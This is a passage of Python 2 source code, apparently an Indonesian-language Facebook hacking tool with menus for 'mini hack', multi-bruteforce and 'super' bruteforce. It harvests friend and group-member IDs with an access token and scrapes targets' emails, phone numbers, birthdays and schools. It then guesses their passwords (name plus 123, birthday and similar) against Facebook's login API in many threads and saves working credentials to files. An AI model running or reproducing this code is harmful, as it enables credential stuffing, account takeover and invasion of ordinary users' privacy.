						save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
						save.write('\033[1;97m 🐧 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m '+str(uid)+' \033[1;96m◊\033[1;97m '+str(pw)+'\n')
						open("CP/%s.txt"%(tanggal),"a").write("%s|%s|%s\n"%(uid, asu, ttl))
						save.close()
						break
					except(KeyError, IOError):
						ttl = ' '
					except:pass
					print '\r\033[1;97m 🐧 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m ' +uid+ ' \033[1;96m◊\033[1;97m ' + asu + '        '
					cp.append(uid+'|'+asu)
					save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
					save.write('\033[1;97m 🐧 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m '+str(uid)+' \033[1;96m◊\033[1;97m '+str(pw)+'\n')
					open("CP/%s.txt"%(tanggal),"a").write(" %s|%s\n"%(uid, asu))
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("\n crack selesai...")
	print
	print
	exit()

def buat_folder():
	try:os.mkdir("CP")
	except:pass
	try:os.mkdir("OK")
	except:pass

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

back = 0
threads = []
id = []
idteman = []
idfromteman = []
	
def id_teman1():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print ' Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        masuk()

    try:
        os.mkdir('out')
    except OSError:
        pass

    try:
        os.system('clear')
        print
	print
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        print('\033[1;96m[\033[1;97m!\033[1;96m] \033[1;97mMENGAMBIL SEMUA \033[1;96mID \033[1;97mTEMAN')
	print('\033[1;97mjika ingin berhenti mengambil ID tekan \033[1;95mctrl \033[1;97m+\033[1;95m z')
	jalan("\033[1;96m¤"*48)
        print
        bz = open('out/id_teman.txt', 'w')
        for a in z['data']:
            idteman.append(a['id'])
            bz.write(a['id'] + '\n')
            print '\r\x1b[1;96m [\x1b[1;97m•\x1b[1;96m] \x1b[1;97m' + str(len(idteman)) + '  \033[1;96m◊\033[1;97m ',
            sys.stdout.flush()
            time.sleep(0.005)
            print '\x1b[1;97m' + a['id']

        bz.close()
        print '\n\x1b[1;97m [\x1b[1;96m\xe2\x9c\x93\x1b[1;97m] \33[3;1m\x1b[1;96msukses mengambil ID\33[0;1m '
        print '\r\33[0;1m\x1b[1;97m [\x1b[1;96m\xe2\x80\xa2\x1b[1;97m] \33[3;1m\x1b[1;96mtotal ID\x1b[1;97m :\x1b[1;93m %s' % len(idteman)
        done = raw_input('\r\33[0;1m\x1b[1;97m [\x1b[1;96m\xe2\x80\xa2\x1b[1;97m] \33[3;1m\x1b[1;96msimpan nama file\x1b[1;97m : \x1b[1;93m')
        os.rename('out/id_teman.txt', 'out/' + done)
        print '\r\33[0;1m\x1b[1;97m [\x1b[1;96m\xe2\x80\xa2\x1b[1;97m] \33[3;1m\x1b[1;96mfile tersimpan \x1b[1;97m: \x1b[1;93mout/' + done
	print
        exit()
    except IOError:
        print '\33[0;1m\x1b[1;97m [\x1b[1;96m!\x1b[1;97m] \33[3;1m\x1b[1;96mgagal membuat file'
	print
        exit()
    except (KeyboardInterrupt, EOFError):
        print '\33[0;1m\x1b[1;97m [\x1b[1;96m!\x1b[1;97m] \33[3;1m\x1b[1;96mterhenti ! '
	print
        exit()
    except KeyError:
        print '\33[0;1m\x1b[1;97m [\x1b[1;96m!\x1b[1;97m] \33[3;1m\x1b[1;96mgagal '
	print
        exit()
    except OSError:
        print '\33[0;1m\x1b[1;97m [\x1b[1;96m!\x1b[1;97m] \33[3;1m\x1b[1;96mfile anda tidak tersimpan !'
	print
        exit()
    except requests.exceptions.ConnectionError:
        print '\33[0;1m\x1b[1;97m [\x1b[1;96m!\x1b[1;97m] \33[3;1m\x1b[1;96mTidak ada koneksi !'
	print
        exit()
	
def idfrom_teman1():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print ' Token Invalid'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        masuk()

    try:
        os.mkdir('out')
    except OSError:
        pass

    try:
        os.system('clear')
        print
	print
        idt = raw_input('\x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mUser ID Target : \033[1;93m')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print '\x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mNama Akun      : \x1b[1;93m' + op['name']
        except KeyError:
            print ' \x1b[1;91mID Publik Tidak Ada !'
            raw_input('\n\x1b[1;93m[\x1b[1;91mKembali\x1b[1;93m]')
            dump()

        r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(50000)&access_token=' + toket)
        z = json.loads(r.text)
        print('\033[1;96m[\033[1;97m!\033[1;96m] \033[1;97mMENGAMBIL SEMUA \033[1;96mID \033[1;97mTEMAN')
	print('\033[1;97mjika ingin berhenti mengambil ID tekan \033[1;95mctrl \033[1;97m+\033[1;95m z')
	jalan("\033[1;96m¤"*48)
        print
        bz = open('out/id_teman_from_teman.txt', 'w')
        for a in z['friends']['data']:
            idfromteman.append(a['id'])
            bz.write(a['id'] + '\n')
            print '\r\x1b[1;96m [\x1b[1;97m•\x1b[1;96m] \x1b[1;97m' + str(len(idfromteman)) + '  \033[1;96m◊\033[1;97m ',
            sys.stdout.flush()
            time.sleep(0.005)
            print '\x1b[1;97m' + a['id']

        bz.close()
        print '\n\x1b[1;97m [\x1b[1;96m\xe2\x9c\x93\x1b[1;97m] \33[3;1m\x1b[1;96msukses mengambil ID\33[0;1m '
        print '\r\33[0;1m\x1b[1;97m [\x1b[1;96m\xe2\x80\xa2\x1b[1;97m] \33[3;1m\x1b[1;96mtotal ID\x1b[1;97m :\x1b[1;93m %s' % len(idfromteman)
        done = raw_input('\r\33[0;1m\x1b[1;97m [\x1b[1;96m\xe2\x80\xa2\x1b[1;97m] \33[3;1m\x1b[1;96msimpan nama file\x1b[1;97m : \x1b[1;93m')
        os.rename('out/id_teman_from_teman.txt', 'out/' + done)
        print '\r\33[0;1m\x1b[1;97m [\x1b[1;96m\xe2\x80\xa2\x1b[1;97m] \33[3;1m\x1b[1;96mfile tersimpan \x1b[1;97m: \x1b[1;93mout/' + done
	print
        exit()
    except IOError:
        print '\33[0;1m\x1b[1;97m [\x1b[1;96m!\x1b[1;97m] \33[3;1m\x1b[1;96mgagal membuat file'
	print
        exit()
    except (KeyboardInterrupt, EOFError):
        print '\33[0;1m\x1b[1;97m [\x1b[1;96m!\x1b[1;97m] \33[3;1m\x1b[1;96mterhenti ! '
	print
        exit()
    except KeyError:
        print '\33[0;1m\x1b[1;97m [\x1b[1;96m!\x1b[1;97m] \33[3;1m\x1b[1;96mgagal '
	print
        exit()
    except OSError:
        print '\33[0;1m\x1b[1;97m [\x1b[1;96m!\x1b[1;97m] \33[3;1m\x1b[1;96mfile anda tidak tersimpan !'
	print
        exit()
    except requests.exceptions.ConnectionError:
        print '\33[0;1m\x1b[1;97m [\x1b[1;96m!\x1b[1;97m] \33[3;1m\x1b[1;96mTidak ada koneksi !'
	print
        exit()		

def informasi():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    
    print
    print("\033[1;96m¤"*48)
    id = raw_input('\x1b[1;96m[\x1b[1;97m+\x1b[1;96m] \x1b[1;97mMasukan ID/Nama\x1b[1;97m : \x1b[1;93m')
    print('\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;97mTunggu sebentar \x1b[1;97m.....')
    r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    cok = json.loads(r.text)
    for p in cok['data']:
        if id in p['name'] or id in p['id']:
            r = requests.get('https://graph.facebook.com/' + p['id'] + '?access_token=' + toket)
            z = json.loads(r.text)
            jalan ("\033[1;96m¤"*48)
	    time.sleep(0.07)
	    print
            try:
                jalan ('\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;97mNama\x1b[1;97m          :\x1b[1;93m ' + z['name'])
            except KeyError:
                jalan ('\x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mNama\x1b[1;97m          : \x1b[1;91mTidak ada')
            else:
                try:
                    jalan ('\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;97mID\x1b[1;97m            :\x1b[1;93m ' + z['id'])
                except KeyError:
                    jalan ('\x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97m            : \x1b[1;91mTidak ada')
                else:
                    try:
                        jalan ('\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;97mEmail\x1b[1;97m         :\x1b[1;93m ' + z['email'])
                    except KeyError:
                        jalan ('\x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mEmail\x1b[1;97m         : \x1b[1;91mTidak ada')
                    else:
                        try:
                            jalan ('\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;97mNomor HP\x1b[1;97m      : ' + z['mobile_phone'])
                        except KeyError:
                            jalan ('\x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mNomor HP\x1b[1;97m      : \x1b[1;91mTidak ada')
			else:
                            try:
                            	jalan ('\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;97mLokasi\x1b[1;97m        :\x1b[1;93m ' + z['location']['name'])
                            except KeyError:
                            	jalan ('\x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mLokasi\x1b[1;97m        : \x1b[1;91mTidak ada')

                    try:
                        jalan ('\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;97mTanggal Lahir\x1b[1;97m :\x1b[1;93m ' + z['birthday'])
                    except KeyError:
                        jalan ('\x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mTanggal Lahir\x1b[1;97m : \x1b[1;91mTidak ada')

                try:
                    jalan ('\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;97mSekolah\x1b[1;97m       : ')
                    for q in z['education']:
                        try:
                            jalan ('\x1b[1;93m                   ~ \x1b[1;93m' + q['school']['name'])
                        except KeyError:
                            jalan ('\x1b[1;93m                   ~ \x1b[1;91mTidak ada')

                except KeyError:
                    pass

            raw_input('\n\x1b[1;96m[ \x1b[1;97mKembali \x1b[1;96m]')
            menu()
    else:
        print '\x1b[1;91m[\xe2\x9c\x96] Pengguna tidak ditemukan'
        raw_input('\n\x1b[1;96m[ \x1b[1;97mKembali \x1b[1;96m]')
        menu()


def menu_hack():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    banner()
    print
    print
    print '\x1b[1;36;40m[\x1b[1;37;40m1\x1b[1;36;40m] \x1b[1;37;40mMini hack facebook (\x1b[1;92mtarget\x1b[1;97m)'
    print '\x1b[1;36;40m[\x1b[1;37;40m2\x1b[1;36;40m] \x1b[1;37;40mMulti bruteforce facebook'
    print '\x1b[1;36;40m[\x1b[1;37;40m3\x1b[1;36;40m] \x1b[1;37;40mSuper multi bruteforce facebook'
    print '\x1b[1;36;40m[\x1b[1;37;40m4\x1b[1;36;40m] \x1b[1;37;40mBruteforce (\x1b[1;92mtarget\x1b[1;97m)'
    print '\x1b[1;37;40m[\x1b[1;36;40m0\x1b[1;37;40m] \x1b[1;36;40mKembali ke MENU UTAMA'
    print
    hack_pilih()


def hack_pilih():
    hack = raw_input('\x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;96mpilih :\x1b[1;93m ')
    if hack == '':
    	print
        print ("\033[1;97mpilih yang benar.......!!!")
	print
        hack_pilih()
    else:
        if hack == '1':
            mini()
        else:
            if hack == '2':
                crack()
                hasil()
            else:
                if hack == '3':
                    super()
                else:
                    if hack == '4':
                        brute()
                    else:
                        if hack == '0':
                            menu()
                        else:
                            print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + hack + ' \x1b[1;91mTidak ada'
                            hack_pilih()
         
def mini():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
	print
        print '\x1b[1;96m[\x1b[1;97mINFO\x1b[1;96m] \x1b[1;96mTarget harus berteman dengan akun tumbal'
	print
        try:
            jalan ("\033[1;96m¤"*48)
	    id = raw_input('\x1b[1;96m[\x1b[1;97m+\x1b[1;96m] \x1b[1;97mID target :\x1b[1;93m ')
	    r = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
            a = json.loads(r.text)
	    print '\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;97mNama      : \x1b[1;93m' + a['name']
            jalan('\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;97mTunggu sebentar.....')
            jalan ("\033[1;96m¤"*48)
	    print
            jalan('\x1b[1;96m[\x1b[1;97m+\x1b[1;96m] \x1b[1;97mMemeriksa')
            time.sleep(2)
            jalan('\x1b[1;96m[\x1b[1;97m+\x1b[1;96m] \x1b[1;97mKode keamanan')
            time.sleep(2)
            jalan('\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;97mMohon Tunggu sebentar.....')
	    print
            pz1 = a['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            y = json.load(data)
            if 'access_token' in y:
                jalan ('\x1b[1;91m[+] \x1b[1;92mDitemukan.')
                jalan ('\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name'])
                jalan ('\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id)
                jalan ('\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : \x1b[1;97m' + pz1)
                raw_input('\n\x1b[1;96m[ \x1b[1;97mKembali \x1b[1;96m]')
                menu_hack()
            else:
                if 'www.facebook.com' in y['error_msg']:
                    jalan ('\x1b[1;96m[\x1b[1;97m+\x1b[1;96m] \x1b[1;92mDitemukan.')
                    jalan ('\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;93mAkun kena Checkpoint')
                    jalan ('\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;97mNama\x1b[1;97m     : ' + a['name'])
                    jalan ('\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;97mUsername\x1b[1;97m : ' + id)
                    jalan ('\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;97mPassword\x1b[1;97m : \x1b[1;92m' + pz1)
                    raw_input('\n\x1b[1;96m[ \x1b[1;97mKembali \x1b[1;96m]')
                    menu_hack()
                else:
                    pz2 = a['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    y = json.load(data)
                    if 'access_token' in y:
                        jalan ('\x1b[1;91m[+] \x1b[1;92mDitemukan.')
                	jalan ('\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name'])
                	jalan ('\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id)
                	jalan ('\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : \x1b[1;97m' + pz2)
                	raw_input('\n\x1b[1;96m[ \x1b[1;97mKembali \x1b[1;96m]')
                        menu_hack()
                    else:
                        if 'www.facebook.com' in y['error_msg']:
                            jalan ('\x1b[1;96m[\x1b[1;97m+\x1b[1;96m] \x1b[1;92mDitemukan.')
			    jalan ('\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;93mAkun kena Checkpoint')
			    jalan ('\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;97mNama\x1b[1;97m     : ' + a['name'])
			    jalan ('\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;97mUsername\x1b[1;97m : ' + id)
			    jalan ('\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;97mPassword\x1b[1;97m : \x1b[1;92m' + pz2)
			    raw_input('\n\x1b[1;96m[ \x1b[1;97mKembali \x1b[1;96m]')
                            menu_hack()
                        else:
                            pz3 = a['last_name']
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            y = json.load(data)
                            if 'access_token' in y:
                                jalan ('\x1b[1;91m[+] \x1b[1;92mDitemukan.')
                		jalan ('\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name'])
               	 		jalan ('\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id)
                		jalan ('\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : \x1b[1;97m' + pz3)
                		raw_input('\n\x1b[1;96m[ \x1b[1;97mKembali \x1b[1;96m]')
                                menu_hack()
                            else:
                                if 'www.facebook.com' in y['error_msg']:
                                    jalan ('\x1b[1;96m[\x1b[1;97m+\x1b[1;96m] \x1b[1;92mDitemukan.')
				    jalan ('\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;93mAkun kena Checkpoint')
				    jalan ('\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;97mNama\x1b[1;97m     : ' + a['name'])
				    jalan ('\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;97mUsername\x1b[1;97m : ' + id)
				    jalan ('\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;97mPassword\x1b[1;97m : \x1b[1;92m' + pz3)
				    raw_input('\n\x1b[1;96m[ \x1b[1;97mKembali \x1b[1;96m]')
                                    menu_hack()
                                else:
                                    lahir = a['birthday']
                                    pz4 = lahir.replace('/', '')
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    y = json.load(data)
                                    if 'access_token' in y:
                                        jalan ('\x1b[1;91m[+] \x1b[1;92mDitemukan.')
                			jalan ('\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name'])
                			jalan ('\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id)
                			jalan ('\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : \x1b[1;97m' + pz4)
               		 		raw_input('\n\x1b[1;96m[ \x1b[1;97mKembali \x1b[1;96m]')
                                        menu_hack()
                                    else:
                                        if 'www.facebook.com' in y['error_msg']:
                                            jalan ('\x1b[1;96m[\x1b[1;97m+\x1b[1;96m] \x1b[1;92mDitemukan.')
					    jalan ('\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;93mAkun kena Checkpoint')
					    jalan ('\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;97mNama\x1b[1;97m     : ' + a['name'])
					    jalan ('\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;97mUsername\x1b[1;97m : ' + id)
					    jalan ('\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;97mPassword\x1b[1;97m : \x1b[1;92m' + pz4)
					    raw_input('\n\x1b[1;96m[ \x1b[1;97mKembali \x1b[1;96m]')
                                            menu_hack()
                                        else:
                                            print '\x1b[1;91m[!] Maaf, gagal membuka password target :('
                                            print '\x1b[1;91m[!] Cobalah dengan cara lain.'
                                            raw_input('\n\x1b[1;96m[ \x1b[1;97mKembali \x1b[1;96m]')
                                            menu_hack()
        except KeyError:
            print '\x1b[1;91m[!] Terget tidak ditemukan'
            raw_input('\n\x1b[1;96m[ \x1b[1;97mKembali \x1b[1;96m]')
            menu_hack()


def crack():
    global file
    global idlist
    global passw
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('reset')
        print logo
        print("\033[1;96m¤"*48)
        idlist = raw_input('\x1b[1;91m[+] \x1b[1;92mFile ID  \x1b[1;91m: \x1b[1;97m')
        passw = raw_input('\x1b[1;91m[+] \x1b[1;92mPassword \x1b[1;91m: \x1b[1;97m')
        try:
            file = open(idlist, 'r')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
            for x in range(40):
                zedd = threading.Thread(target=scrak, args=())
                zedd.start()
                threads.append(zedd)

            for zedd in threads:
                zedd.join()

        except IOError:
            print '\x1b[1;91m[!] File tidak ditemukan'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu_hack()

def scrak():
    global back
    global berhasil
    global cekpoint
    global gagal
    global up
    try:
        buka = open(idlist, 'r')
        up = buka.read().split()
        while file:
            username = file.readline().strip()
            url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + passw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
            data = urllib.urlopen(url)
            mpsh = json.load(data)
            if back == len(up):
                break
            if 'access_token' in mpsh:
                bisa = open('Berhasil.txt', 'w')
                bisa.write(username + ' | ' + passw + '\n')
                bisa.close()
                berhasil.append('\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + username + ' | ' + passw)
                back += 1
            else:
                if 'www.facebook.com' in mpsh['error_msg']:
                    cek = open('Cekpoint.txt', 'w')
                    cek.write(username + ' | ' + passw + '\n')
                    cek.close()
                    cekpoint.append('\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + username + ' | ' + passw)
                    back += 1
                else:
                    gagal.append(username)
                    back += 1
            sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCrack    \x1b[1;91m:\x1b[1;97m ' + str(back) + ' \x1b[1;96m>\x1b[1;97m ' + str(len(up)) + ' =>\x1b[1;92mLive\x1b[1;91m:\x1b[1;96m' + str(len(berhasil)) + ' \x1b[1;97m=>\x1b[1;93mCheck\x1b[1;91m:\x1b[1;96m' + str(len(cekpoint)))
            sys.stdout.flush()

    except IOError:
        print '\n\x1b[1;91m[!] Koneksi terganggu'
        time.sleep(1)
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'

def hasil():
    print
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    for b in berhasil:
        print b

    for c in cekpoint:
        print c

    print
    print '\x1b[31m[x] Gagal \x1b[1;97m--> ' + str(len(gagal))
    keluar()


def super():
    global toket
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('reset')
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;37;40m1. Crack dari daftar Teman'
    print '\x1b[1;37;40m2. Crack dari member Grup'
    print '\x1b[1;31;40m0. Kembali'
    print
    pilih_super()


def pilih_super():
    peak = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
    if peak == '':
        print '\x1b[1;91m[!] Jangan kosong'
        pilih_super()
    else:
        if peak == '1':
            os.system('reset')
            print logo
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            jalan('\x1b[1;91m[+] \x1b[1;92mMengambil id teman \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        else:
            if peak == '2':
                os.system('reset')
                print logo
                print 40 * '\x1b[1;97m\xe2\x95\x90'
                idg = raw_input('\x1b[1;91m[+] \x1b[1;92mID Grup   \x1b[1;91m:\x1b[1;97m ')
                try:
                    r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                    asw = json.loads(r.text)
                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama grup \x1b[1;91m:\x1b[1;97m ' + asw['name']
                except KeyError:
                    print '\x1b[1;91m[!] Grup tidak ditemukan'
                    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                    super()

                re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
                s = json.loads(re.text)
                for i in s['data']:
                    id.append(i['id'])

            else:
                if peak == '0':
                    menu_hack()
                else:
                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mTidak ada'
                    pilih_super()
    print '\x1b[1;91m[+] \x1b[1;92mJumlah ID \x1b[1;91m: \x1b[1;97m' + str(len(id))
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCrack \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)

    print
    print 40 * '\x1b[1;97m\xe2\x95\x90'

    def main(arg):
        user = arg
        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass1
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass1
                else:
                    pass2 = b['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass2
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass2
                        else:
                            pass3 = b['last_name'] + '123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass3
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass3
                                else:
                                    lahir = b['birthday']
                                    pass4 = lahir.replace('/', '')
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass4
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
